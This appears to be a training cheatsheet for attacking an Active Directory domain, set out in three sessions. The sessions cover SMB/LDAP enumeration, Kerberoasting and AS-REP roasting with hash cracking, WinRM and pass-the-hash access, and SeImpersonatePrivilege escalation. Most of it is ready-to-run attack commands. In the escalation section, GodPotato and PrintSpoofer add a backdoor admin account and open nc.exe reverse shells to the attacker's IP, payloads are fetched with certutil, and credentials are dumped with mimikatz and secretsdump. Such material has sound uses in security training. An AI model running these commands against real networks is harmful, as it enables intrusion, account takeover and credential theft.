# 🔴 AD Pentest — Toolset & Cheatsheet

# Session 1: SMB + LDAP | Session 2: Kerberoasting + AS-REP + Initial Access | Session 3: PrivEsc

-----

# ══════════════════════════════════════════════

# SESSION 1 — SMB + LDAP ENUMERATION

# ══════════════════════════════════════════════

## 🛠️ Tools

|Tool         |Purpose                      |Install                  |
|-------------|-----------------------------|-------------------------|
|nmap         |Port scan, service detection |pre-installed            |
|smbclient    |Connect to SMB shares        |pre-installed            |
|crackmapexec |SMB/LDAP enum, spray, exec   |pip3 install crackmapexec|
|enum4linux-ng|Full SMB+RPC+LDAP enumeration|apt install enum4linux-ng|
|ldapsearch   |Query LDAP/AD directly       |apt install ldap-utils   |
|windapsearch |Cleaner LDAP output          |pip3 install windapsearch|

-----

## 📋 SMB Cheatsheet

```bash
# ── DISCOVERY ──────────────────────────────────────────
nmap -sC -sV -p 445,139 <IP>

# ── LIST SHARES (no creds) ─────────────────────────────
smbclient -L //<IP>/ -N
crackmapexec smb <IP> --shares -u '' -p ''
crackmapexec smb <IP> --shares -u 'guest' -p ''
enum4linux-ng -A <IP>

# ── ACCESS A SHARE ──────────────────────────────────────
smbclient //<IP>/<ShareName> -N
smbclient //<IP>/<ShareName> -U 'guest'
smbclient //<IP>/<ShareName> -U 'user%password'

# ── INSIDE SMBCLIENT ───────────────────────────────────
ls                        # list files
cd <folder>               # change directory
get <filename>            # download one file
mget *                    # download everything
recurse ON                # enable recursive listing
prompt OFF                # disable confirmation
mget *                    # download all recursively

# ── ENUMERATE USERS VIA SMB ────────────────────────────
crackmapexec smb <IP> -u '' -p '' --rid-brute
crackmapexec smb <IP> -u '' -p '' --users
rpcclient -U "" -N <IP>
  > enumdomusers          # list all users
  > enumdomgroups         # list all groups
  > queryuser <RID>       # get details for a user

# ── VALIDATE CREDENTIALS ───────────────────────────────
crackmapexec smb <IP> -u 'username' -p 'password'
crackmapexec smb <IP> -u users.txt -p passwords.txt

# ── DECODE BASE64 (if creds are encoded) ───────────────
echo "V2ViQGRtaW4yMDI0IQ==" | base64 -d
```

-----

## 📋 LDAP Cheatsheet

```bash
# ── TEST NULL BIND ─────────────────────────────────────
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local"

# ── DUMP ALL USERS ─────────────────────────────────────
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

# ── FIND CREDENTIALS IN DESCRIPTION FIELDS ────────────
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" "(description=*)" sAMAccountName description
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" | grep -i "description\|pass\|pwd\|cred\|temp"

# ── DUMP EVERYTHING AND SAVE ───────────────────────────
ldapsearch -x -H ldap://<IP> -b "DC=domain,DC=local" > ldap_dump.txt
grep -i "sAMAccountName\|description\|userPassword" ldap_dump.txt

# ── WITH CREDENTIALS ───────────────────────────────────
ldapsearch -x -H ldap://<IP> -D "username@domain.local" -w "password" -b "DC=domain,DC=local"

# ── CRACKMAPEXEC LDAP ──────────────────────────────────
crackmapexec ldap <IP> -u '' -p '' --users
crackmapexec ldap <IP> -u 'username' -p 'password' --users
crackmapexec ldap <IP> -u 'username' -p 'password' --groups

# ── WINDAPSEARCH (cleaner output) ──────────────────────
windapsearch --dc <IP> -d domain.local -U            # all users
windapsearch --dc <IP> -d domain.local --da          # domain admins
windapsearch --dc <IP> -d domain.local -U --full     # full user attributes
```

-----

# ══════════════════════════════════════════════

# SESSION 2 — KERBEROASTING + AS-REP + INITIAL ACCESS

# ══════════════════════════════════════════════

## 🛠️ Tools

|Tool        |Purpose                             |Install                  |
|------------|------------------------------------|-------------------------|
|Impacket    |GetUserSPNs, GetNPUsers, psexec, etc|pip3 install impacket    |
|hashcat     |Crack Kerberos + AS-REP hashes      |apt install hashcat      |
|john        |Alternative hash cracker            |pre-installed            |
|evil-winrm  |WinRM shell with credentials        |gem install evil-winrm   |
|crackmapexec|Validate creds, check WinRM         |pip3 install crackmapexec|

-----

## 📋 Kerberoasting Cheatsheet

```bash
# ── FIND KERBEROASTABLE ACCOUNTS ──────────────────────
# Requires valid domain credentials
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP>

# ── REQUEST TICKETS AND SAVE ───────────────────────────
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP> -request
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.hash

# Example:
GetUserSPNs.py corp.local/webadmin:W3b@dmin2024 -dc-ip 10.20.1.10 -request -outputfile kerb.hash

# ── CRACK THE HASH ──────────────────────────────────────
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt kerb.hash

# Hash format looks like:
# $krb5tgs$23$*svc_backup$CORP.LOCAL$...
```

-----

## 📋 AS-REP Roasting Cheatsheet

```bash
# ── NEED USERLIST FIRST ────────────────────────────────
# Save usernames one per line in users.txt

# ── CHECK FOR ACCOUNTS WITH PRE-AUTH DISABLED ──────────
# No credentials needed:
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>
GetNPUsers.py <domain>/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.hash

# Example:
GetNPUsers.py corp2.local/ -usersfile users.txt -no-pass -dc-ip 10.20.2.10 -outputfile asrep.hash

# With valid creds (finds all AS-REP roastable users automatically):
GetNPUsers.py <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile asrep.hash

# ── CRACK THE HASH ──────────────────────────────────────
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash

# Hash format looks like:
# $krb5asrep$23$dev_jenkins@CORP2.LOCAL:...
```

-----

## 📋 Initial Access — evil-winrm Cheatsheet

```bash
# ── CHECK WINRM IS OPEN ─────────────────────────────────
nmap -p 5985,5986 <IP>
crackmapexec winrm <IP> -u 'username' -p 'password'

# ── CONNECT WITH PASSWORD ──────────────────────────────
evil-winrm -i <IP> -u 'username' -p 'password'

# Example:
evil-winrm -i 10.20.1.20 -u svc_backup -p 'Backup2024!'

# ── CONNECT WITH HASH (Pass-the-Hash) ─────────────────
evil-winrm -i <IP> -u 'username' -H 'NTLMhash'

# ── USEFUL INSIDE EVIL-WINRM ───────────────────────────
upload /local/path/file.exe          # upload file to target
download C:\path\file.txt            # download file from target
menu                                 # show extra features
Invoke-Binary ./tool.exe             # run binary in memory

# ── IMPACKET ALTERNATIVES ──────────────────────────────
psexec.py  domain/user:pass@<IP>     # SYSTEM shell, noisy
wmiexec.py domain/user:pass@<IP>     # user shell, quieter
smbexec.py domain/user:pass@<IP>     # SMB-based shell

# ── FIRST COMMANDS AFTER SHELL ─────────────────────────
whoami
whoami /priv                         # ← look for SeImpersonatePrivilege
whoami /all
net user <username>
ipconfig /all
```

-----

# ══════════════════════════════════════════════

# SESSION 3 — PRIVILEGE ESCALATION

# SeImpersonatePrivilege → SYSTEM

# ══════════════════════════════════════════════

## 🛠️ Tools

|Tool                  |Purpose                          |Install / Download                                  |
|----------------------|---------------------------------|----------------------------------------------------|
|winPEAS               |Automated Windows privesc enum   |<https://github.com/carlospolop/PEASS-ng/releases>  |
|GodPotato             |SeImpersonate → SYSTEM (all OS)  |<https://github.com/BeichenDream/GodPotato/releases>|
|PrintSpoofer          |SeImpersonate → SYSTEM (older OS)|<https://github.com/itm4n/PrintSpoofer/releases>    |
|netcat (nc.exe)       |Reverse shell catcher on Windows |pre-installed on Kali / upload to target            |
|python3 -m http.server|Host files for download          |pre-installed                                       |

-----

## 📋 SeImpersonatePrivilege Cheatsheet

```bash
# ── STEP 1: CONFIRM THE PRIVILEGE ──────────────────────
whoami /priv

# Look for this line (must say Enabled):
# SeImpersonatePrivilege    Impersonate a client after authentication    Enabled

# ── STEP 2: HOST FILES ON KALI ─────────────────────────
cd /path/to/tools/
python3 -m http.server 8080

# ── STEP 3: DOWNLOAD EXPLOIT TO TARGET ─────────────────
# Inside evil-winrm:
upload /path/to/GodPotato-NET4.exe

# Or via PowerShell on target:
iwr http://<your_IP>:8080/GodPotato-NET4.exe -OutFile GodPotato.exe
certutil -urlcache -f http://<your_IP>:8080/GodPotato-NET4.exe GodPotato.exe

# ── STEP 4a: GODPOTATO (recommended — works on most OS) ─
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
.\GodPotato-NET4.exe -cmd "cmd /c whoami > C:\Users\Public\out.txt && type C:\Users\Public\out.txt"

# Add admin user:
.\GodPotato-NET4.exe -cmd "cmd /c net user hacker Password123! /add"
.\GodPotato-NET4.exe -cmd "cmd /c net localgroup administrators hacker /add"

# Reverse shell:
.\GodPotato-NET4.exe -cmd "cmd /c nc.exe <your_IP> 4444 -e cmd"

# ── STEP 4b: PRINTSPOOFER (Windows 10 / Server 2019) ───
.\PrintSpoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -i -c powershell
.\PrintSpoofer64.exe -c "cmd /c whoami"

# Reverse shell:
.\PrintSpoofer64.exe -c "cmd /c nc.exe <your_IP> 4444 -e cmd"

# ── STEP 5: CATCH REVERSE SHELL ON KALI ────────────────
nc -lvnp 4444

# Confirm SYSTEM:
whoami
# nt authority\system  ✅

# ── STEP 6: DUMP HASHES AFTER SYSTEM ──────────────────
# Option 1 — secretsdump remotely from Kali:
secretsdump.py domain/Administrator:password@<IP>
secretsdump.py domain/Administrator@<IP> -hashes :NTLMhash

# Option 2 — SAM dump via crackmapexec:
crackmapexec smb <IP> -u Administrator -p password --sam
crackmapexec smb <IP> -u Administrator -H NTLMhash --sam

# Option 3 — Mimikatz on target:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
.\mimikatz.exe "privilege::debug" "lsadump::sam" exit
```

-----

## 📋 winPEAS Quick Usage

```bash
# Upload and run:
upload /path/to/winPEASx64.exe
.\winPEASx64.exe

# Key sections to look at in output:
# [+] PowerShell Settings          → execution policy, version
# [+] Users Information            → local users, admins
# [+] Services Information         → unquoted paths, weak perms
# [+] Token Privileges             → SeImpersonatePrivilege ← THIS
# [+] Scheduled Tasks              → writable task scripts
# [+] Credentials in files         → stored passwords
```

-----

# ══════════════════════════════════════════════

# QUICK REFERENCE — HASHCAT MODES

# ══════════════════════════════════════════════

|Hash Type        |Mode |Command                                 |
|-----------------|-----|----------------------------------------|
|NTLM             |1000 |hashcat -m 1000 hash.txt rockyou.txt    |
|Kerberoasting TGS|13100|hashcat -m 13100 kerb.hash rockyou.txt  |
|AS-REP Roasting  |18200|hashcat -m 18200 asrep.hash rockyou.txt |
|Net-NTLMv2       |5600 |hashcat -m 5600 netntlm.hash rockyou.txt|

-----

# ══════════════════════════════════════════════

# QUICK REFERENCE — PORTS TO ALWAYS CHECK

# ══════════════════════════════════════════════

|Port|Service  |Why It Matters                           |
|----|---------|-----------------------------------------|
|88  |Kerberos |Confirms you found the DC                |
|139 |NetBIOS  |SMB legacy                               |
|389 |LDAP     |Query AD — try null bind immediately     |
|445 |SMB      |File shares — enumerate first            |
|464 |Kpasswd  |Kerberos password change                 |
|636 |LDAPS    |LDAP over SSL                            |
|3268|GC LDAP  |Global Catalog — covers entire forest    |
|3389|RDP      |GUI access if creds found                |
|5985|WinRM    |evil-winrm shell — check after every cred|
|5986|WinRM SSL|evil-winrm with SSL                      |

-----

# ══════════════════════════════════════════════

# TOOL INSTALLATION — ONE BLOCK

# ══════════════════════════════════════════════

```bash
# Impacket (GetUserSPNs, GetNPUsers, psexec, wmiexec, secretsdump)
pip3 install impacket

# crackmapexec
pip3 install crackmapexec

# evil-winrm
gem install evil-winrm

# enum4linux-ng
apt install enum4linux-ng -y

# ldap-utils (ldapsearch)
apt install ldap-utils -y

# hashcat
apt install hashcat -y

# GodPotato — download from GitHub releases
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe

# PrintSpoofer — download from GitHub releases
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe

# winPEAS — download from GitHub releases
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe

# rockyou wordlist (if not present)
gunzip /usr/share/wordlists/rockyou.txt.gz
```